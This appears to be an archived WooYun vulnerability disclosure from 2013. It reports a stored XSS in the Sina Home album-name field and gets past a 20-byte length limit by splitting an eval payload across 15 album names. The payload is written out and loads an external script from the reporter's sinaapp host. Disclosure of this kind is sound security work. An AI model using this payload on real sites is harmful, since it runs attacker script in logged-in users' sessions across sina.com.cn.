@@ -1,0 +1,298 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪家居某功能储存型xss，绕过长度限制的XSS技巧  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪家居某功能储存型xss，绕过长度限制的XSS技巧  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-03-31 00:27</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-31：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-20：	细节向普通白帽子公开<br/>
+									2013-04-30：	细节向实习白帽子公开<br/>
+									2013-05-15：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">新浪通行证登录，经过测试，此xss影响不到新浪微博，可以影响sina.com.cn域名下的所有产品，缺陷位置限制了长度最多20字节（实际上是18字节），通过了一些构造，可以绕过后进行调用任意外部js文件。很典型的一个长度限制绕过的xss利用的案例~~</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">测试效果地址（漏洞证明）：http://u.bbs.house.sina.com.cn/space.php?mod=myalbums&amp;uid=1821326284<br />
+<br />
+<br />
+<br />
+1 缺陷位置为新浪家居的相册名字位置（&lt;img&gt;的value属性）。此处没有过滤任何特殊字符，但是有限制字符长度20字节。<br />
+<br />
+<br />
+<br />
+图1</p><p class="detail"><a href="../images/31000616c8cd4b9d4938602049403c0d2773d13b.png" target="_blank"><img src="../images/31000616c8cd4b9d4938602049403c0d2773d13b.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2 但是，在js中</p><pre><code>alert(1);</code></pre><p class='detail'>可以这样写</p><pre><code>var x=&quot;ale&quot;;x+=&quot;rt(&quot;;x+&quot;=1)&quot;;eval(x);</code></pre><p class='detail'>如图，构造alert(1),成功执行弹窗。两个位置都有影响，不过图片管理那个位置，别人是看不到的。<br />
+<br />
+<br />
+<br />
+图2 3 4 5 6<br />
+<br />
+</p><p class="detail"><a href="../images/310006358e8276e776b978e40bd95176654c58ce.png" target="_blank"><img src="../images/310006358e8276e776b978e40bd95176654c58ce.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/3100065370f8177754b7176d899f3ce993f5c8d7.png" target="_blank"><img src="../images/3100065370f8177754b7176d899f3ce993f5c8d7.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/31000704f3b7c75f31524d7ac3b6145dab6061d6.png" target="_blank"><img src="../images/31000704f3b7c75f31524d7ac3b6145dab6061d6.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/31000713c3a1607033ec6257cafed39ed1bee55a.png" target="_blank"><img src="../images/31000713c3a1607033ec6257cafed39ed1bee55a.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/3100083013aae7edbd90ae56d0b450bc21546fbe.png" target="_blank"><img src="../images/3100083013aae7edbd90ae56d0b450bc21546fbe.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3 测试插入外部js，虽然这里限制为20字节，但是测试时候发现，最多只能插入18个字节。所以就创建15个相册（最多可以创建20个相册），进行构造。<br />
+<br />
+<br />
+<br />
+先进行本地测试，构造代码为。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&quot;&gt;&lt;script&gt;/*<br />
+*/var x=&quot;with(&quot;;/*<br />
+*/x+=&quot;document&quot;;/*<br />
+*/x+=&quot;)body.ap&quot;;/*<br />
+*/x+=&quot;pendChil&quot;;/*<br />
+*/x+=&quot;d(create&quot;;/*<br />
+*/x+=&quot;Element(&quot;;/*<br />
+*/x+=&quot;&#039;script&quot;;/*<br />
+*/x+=&quot;&#039;)).sr&quot;;/*<br />
+*/x+=&quot;c=&#039;//px&quot;;/*<br />
+*/x+=&quot;1624.sin&quot;;/*<br />
+*/x+=&quot;aapp.com&quot;;/*<br />
+*/x+=&quot;/t.js&#039;&quot;;/*<br />
+*/eval(x);/*<br />
+*/&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+alert一下看下构造的代码对不对。<br />
+<br />
+图7</p><p class="detail"><a href="../images/31000933c523aa4524e99a66d03dce0a611a1ec1.png" target="_blank"><img src="../images/31000933c523aa4524e99a66d03dce0a611a1ec1.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后用charles构造进行post发包，过程中，还遇到了很多恶心的问题，比如由于&#039; \ &quot;等特殊字符影响，导致不能一次将15个数据同时插入之类的问题。<br />
+<br />
+<br />
+<br />
+不过通过来回的调试，最终还是给全都解决了。成功插入后，F12看到的如下图。<br />
+<br />
+<br />
+<br />
+图8<br />
+<br />
+</p><p class="detail"><a href="../images/310009424d551b5aa6e4e82b9313933cb993b678.png" target="_blank"><img src="../images/310009424d551b5aa6e4e82b9313933cb993b678.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4 执行外部js中的代码。<br />
+<br />
+<br />
+<br />
+图9<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/310009534e1405389c33ad7a157e426d4028ce87.png" target="_blank"><img src="../images/310009534e1405389c33ad7a157e426d4028ce87.png" alt="9.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+由于是新浪通行证登录，所以可以影响sina.com.cn域名下的所有产品。<br />
+<br />
+<br />
+<br />
+由于新浪微博跨域了，而且还有referer验证，所以影响不到新浪微博。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">漏洞证明：<br />
+<br />
+<br />
+<br />
+漏洞证明地址：http://u.bbs.house.sina.com.cn/space.php?mod=myalbums&amp;uid=1821326284<br />
+<br />
+<br />
+<br />
+1 弹窗。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/3100065370f8177754b7176d899f3ce993f5c8d7.png" target="_blank"><img src="../images/3100065370f8177754b7176d899f3ce993f5c8d7.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2 插入并成功执任意外部js文件。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/310009534e1405389c33ad7a157e426d4028ce87.png" target="_blank"><img src="../images/310009534e1405389c33ad7a157e426d4028ce87.png" alt="9.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复方案，过滤特殊字符。<br />
+<br />
+<br />
+<br />
+ps：新浪的礼物质量好好~好喜欢。哈哈~~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020996" title="新浪家居某功能储存型xss，绕过长度限制的XSS技巧">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：9 </p>
+													<p class="detail">确认时间：2013-03-31 15:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢对新浪安全的支持。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20996";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
